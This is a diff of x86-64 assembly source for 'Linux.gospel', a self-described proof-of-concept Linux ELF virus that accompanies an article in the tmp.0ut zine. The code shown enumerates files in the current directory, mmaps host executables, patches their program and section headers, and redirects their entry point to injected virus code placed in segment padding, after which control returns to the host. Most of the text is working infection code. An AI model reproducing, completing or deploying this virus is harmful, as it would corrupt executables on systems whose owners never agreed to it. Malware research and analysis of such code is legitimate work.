@@ -1,6 +1,4 @@
 BITS 64
-
-
 ;*******************************************************************************
 ; Linux.gospel
 ; Written by ic3qu33n
@@ -14,7 +12,7 @@ BITS 64
 ; It relies on the use of padding bytes between segments as a page-aligned 
 ; region of available memory.
 ;
-; This demo virus is created as the accompaniment to my article 
+; This PoC virus is created as the accompaniment to my article 
 ; “u used 2 call me on my polymorphic shell phone, pt. 1:  
 ; gospel for a new epoch”
 ; to be released in tmp.0ut volume 3.
@@ -122,7 +120,6 @@ BITS 64
 ; https://www.guitmz.com/linux-nasty-elf-virus/ 
 ;  
 ;*******************************************************************************
-;
 ;section	.bss
 ;	struc linuxdirent
 ;		.d_ino:			resq	1
@@ -242,8 +239,6 @@ BITS 64
 ; r14 + 436 ; vxoffset: dd 0
 ; r14 + 440 ; vxshoff: dd 0
 ; r14 + 444 ; vx_padding_size: dd 0
-
-
 ;
 ; r14 + 500 = # of dirent entries returned from getdents64 syscall 
 ;
@@ -254,7 +249,6 @@ BITS 64
 ; r14 + 618			.d_nameq:		resb	1
 ; r14 + 619			.d_type:		resb	1
 ; r14 + 620		endstruc
-;
 ;
 ; r14 + 800 = mmap'd copy of host ELF executable to infect
 ; r14 + 800 	struc elf_ehdr
@@ -321,9 +315,7 @@ BITS 64
 ; r14 + elf_ehdr.e_shoff + 56		.sh_entsize		resq 1		; uint64_t   
 ; r14 + elf_ehdr.e_shoff + 64	endstruc
 
-
-section .data
-
+;section .data
 ;x64 syscall reference
 ;
 ;SYS_READ 		equ 0x0
@@ -341,15 +333,10 @@ section .data
 ;SYS_GETDENTS64	equ 0x4e
 ;SYS_CREAT		equ 0x55
 ;
-;
 ;PAGESIZE dd 4096	
-
-
 ;****************************************************************************************
 ; debug strings
-;
 ;****************************************************************************************
-;
 ;checkelfpass db 'File is an ELF!', 13, 10, 0
 ;checkelfpasslen equ $-checkelfpass
 ;
@@ -422,20 +409,20 @@ section .data
 
 
 ;oshoff: dq 0		;original section header offset
-next_segment_offset: dq 0
+;next_segment_offset: dq 0
 ;fd:	dq 0
-hostentry_offset: dd 0
-vxoffset: dd 0
-vxshoff: dd 0
-vx_padding_size: dd 0
+;hostentry_offset: dd 0
+;vxoffset: dd 0
+;vxshoff: dd 0
+;vx_padding_size: dd 0
 
-MAX_RDENT_BUF_SIZE equ 0x800
-;%define vlen equ vend - _start
+;MAX_RDENT_BUF_SIZE equ 0x800
+;%define vlen equ vend - vxmain
  
-global _start
+global vxmain
 default rel
 section .text
-_start:
+vxmain:
 	jmp vxstart
 	vxsig: db "xoxo",0
 vxstart:
@@ -453,12 +440,11 @@ _getdirents:
 ;;	rdi == filename
 ;;	rsi == flags
 ;;	rdx == mode
-;; 	returns: r14 + 416 (in rax, obv)
+;; 	returns: fd (in rax, obv)
 ;****************************************************************************************
 	pop rdi
 	xor rsi, rsi 		;no flags
 	add rsi, 0x02000000
-	;mov rdx, O_RDONLY	;open read-only
 	mov rdx, 0x0		;open read-only
 	mov rax, 0x2		;SYS_OPEN ==0x2
 	syscall
@@ -484,12 +470,12 @@ get_cwd:
 ;****************************************************************************************
 process_dirents:
 	mov rdi, rax
-	lea rsi, [r14 + 600] 	;r14 + 600 = location on stack where we'll save our dirent struct
-	mov rdx, MAX_RDENT_BUF_SIZE
-	mov rax, 0x4e ;SYS_GETDENTS64
+	lea rsi, [r14 + 600]	;r14 + 600 = location on stack where we'll save our dirent struct
+	mov rdx, 0x800	; MAX_RDENT_BUF_SIZE
+	mov rax, 0x4e	;SYS_GETDENTS64
 	syscall
 
-	mov r8, rax						;save # of dirent entries in r8
+	mov r8, rax 					;save # of dirent entries in r8
 	mov qword [r14 + 500], rax		;also save # of dir entries to local var on stack
 ;****************************************************************************************
 ; close - syscall 0x3
@@ -824,13 +810,13 @@ infect:
 					mov qword [r13 + 24], r10			; update ELF header entry point to point to virus code start
 					mov r10, [r13 + r12 + 8]			;elf_phdr.p_offset  
 					add r10, [r13 + r12 + 32]			;elf_phdr.p_filesz offset
-					mov dword [vxoffset], r10d
+					mov dword [r14 + 436], r10d
 					add qword [r13 + r12 + 32], vlen+6	;elf_phdr.p_filesz offset
 					add qword [r13 + r12 + 40], vlen+6	;elf_phdr.p_memsz offset
 					jmp .next_phdr						;this jmp might be unneccessary but adding it for testing	
 			.mod_subsequent_phdr:
 				xor r11, r11
-				mov r11d, [vxoffset]
+				mov r11d, [r14 + 436]
 				cmp r11d, 0
 				je .next_phdr
 				mov r10, [r13 + r12 + 8]			;elf_phdr.p_offset  
@@ -839,17 +825,17 @@ infect:
 				add dword r10d, [PAGESIZE]
 				mov [r13 + r12 + 8], r10				;elf_phdr.p_offset
 				xor r10, r10
-				mov r10, qword [next_segment_offset]
+				mov r10, qword [r14 + 424]; offset of next segment after .text segment in host ELF
 				cmp r10, 0
 				jne .next_phdr
-				mov qword [next_segment_offset], r11
+				mov qword [r14 + 424], r11; offset of next segment after .text segment in host ELF, r11
 		.next_phdr:
 			pop rcx
 			dec cx 
 			add r12w, word [r13 + 54] 					 ;add elf_ehdr.e_phentsize to phdr offset in r12 
 			cmp cx, 0
 			jg .phdr_loop
-	mov dword [hostentry_offset], r12d
+	mov dword [r14 + 432], r12d
 
 ;****************************************************************************************
 ;	Now update section headers of infected ELF
@@ -878,7 +864,7 @@ infect:
 		.shdr_loop:
 			push rcx
 			mov r11, [r13 + r15 + 24]							;elf_shdr.sh_offset
-			cmp dword r11d, [vxoffset]
+			cmp dword r11d, [r14 + 436]
 			jge .mod_subsequent_shdr
 			jl .check_for_last_text_shdr
 			.check_for_last_text_shdr:
@@ -902,13 +888,13 @@ infect:
 			cmp cx, 0
 			jg .shdr_loop
 	mov r11, [r13 + 40] 					;elf_ehdr.e_shoff
-	mov qword [r14 + 408], r11
-;	cmp dword r11d, [vxoffset]
+	mov qword [r14 + 408], r11				;original shoff
+;	cmp dword r11d, [r14 + 436]
 ;	jge .patch_ehdr_shoff
 	.patch_ehdr_shoff:
 		add dword r11d, [PAGESIZE]
 		mov qword [r13 + 40], r11 			;elf_ehdr.e_shoff
-		mov dword [vxshoff], r11d
+		mov dword [r14 + 440], r11d
 		jmp frankenstein_elf
 	
 
@@ -966,11 +952,11 @@ frankenstein_elf:
 	
 	;write ELF header to temp file
 
-	cmp dword [hostentry_offset], PAGESIZE
+	cmp dword [r14 + 432], PAGESIZE
 	jl .adjust_offset_ehdr_phdr_copy
 	jmp .offset_ehdr_phdr_copy_pagesize
 	.adjust_offset_ehdr_phdr_copy:
-		add dword edx, [vxoffset]
+		add dword edx, [r14 + 436]
 		jmp .write_host_ehdr_phdrs_textsegment
 	.offset_ehdr_phdr_copy_pagesize:
 		mov rdx, [PAGESIZE]
@@ -993,10 +979,10 @@ frankenstein_elf:
 			sub rax, .delta
 		mov rdi, r9
 		mov rdx, vlen
-		lea rsi, [rax + _start]
-		;add rsi, _start
-		;sub rsi, (vxstart - _start)
-		mov r10d, dword [vxoffset]
+		lea rsi, [rax + vxmain]
+		;add rsi, vxmain
+		;sub rsi, (vxstart - vxmain)
+		mov r10d, dword [r14 + 436]
 		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
 
@@ -1006,8 +992,8 @@ frankenstein_elf:
 		mov dword [r14 + 181], r8d			;address of original host entry point
 		mov byte [r14 + 185], 0xc3			;0xc3 = ret
 		lea rsi, [r14+ 180]
-		mov r10d, dword [vxoffset]
-		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
+		mov r10d, dword [r14 + 436]
+		add r10d, dword vlen				;file offset adjusted to r14 + 436+vlen
 		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
 		
@@ -1026,8 +1012,8 @@ frankenstein_elf:
 		;;;add esi, 6
 		;;;xor r10, r10
 		mov r11d, dword [PAGESIZE]
-		;;;mov r10d, dword [vxoffset]
-		;;;add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
+		;;;mov r10d, dword [r14 + 436]
+		;;;add r10d, dword vlen				;file offset adjusted to r14 + 436+vlen
 		add r10d, 6							;add 6 bytes for push/ret original entrypoint
 		;;;sub r11d, r10d
 		;mov rsi, r10
@@ -1044,10 +1030,10 @@ frankenstein_elf:
 		;shl r11d, 1
 		;;add eax, dword [PAGESIZE] 
 		;;add eax, r11d 
-		mov rsi, qword [next_segment_offset]
+		mov rsi, qword [r14 + 424]				;offset of next segment after .text segment in host ELF
 		add esi, r11d 
-		;;mov dword [vx_padding_size], eax
-		mov dword [vx_padding_size], esi
+		;;mov dword [r14 + 444], eax
+		mov dword [r14 + 444], esi				;vx_padding_size (# of bytes of padding after vx)
 ;		mov esi, eax
 		mov rax, 0x4d ;SYS_FTRUNCATE
 		syscall
@@ -1055,22 +1041,22 @@ frankenstein_elf:
 
 	.write_datasegment_totemp:
 		xor r10, r10
-		mov rdx, qword [r14 + 408]
-		sub edx, dword [next_segment_offset]
+		mov rdx, qword [r14 + 408]				; original shoff
+		sub edx, dword [r14 + 424]				; offset of next segment after .text segment in host ELF
 		lea rsi, [r13]							;r13 contains pointer to mmap'd file
-		add rsi, qword [next_segment_offset]	;adjust rsi address to point to PT_LOAD segment 
+		add rsi, qword [r14 + 424]				;adjust rsi address to point to PT_LOAD segment 
 												;following .text segment in mmap'd original host file
-		mov r10d, dword [vx_padding_size]
+		mov r10d, dword [r14 + 444]				;vx_padding_size (# of bytes of padding after vx)
 		mov rax, 0x12							;SYS_PWRITE64 	equ 0x12
 		syscall
 ;		jmp .close_temp
 
 	.write_patched_shdrs_totemp:
 		mov rdx, [r14 + 48] 					;filestat.st_size
-		sub rdx, qword [r14 + 408]
+		sub rdx, qword [r14 + 408]				; original shoff
 		lea rsi, [r13]
-		add rsi, qword [r14 + 408]
-		mov r10d, dword [vxshoff]
+		add rsi, qword [r14 + 408]				; original shoff			
+		mov r10d, dword [r14 + 440]				;vx SH offset
 		mov rax, 0x12							;SYS_PWRITE64 	equ 0x12
 		syscall
 
@@ -1098,7 +1084,7 @@ _restore:
 	pop rbp
 
 
-vlen equ $-_start
+vlen equ $-vxmain
 vend:
 _end:
 	xor rdi, rdi
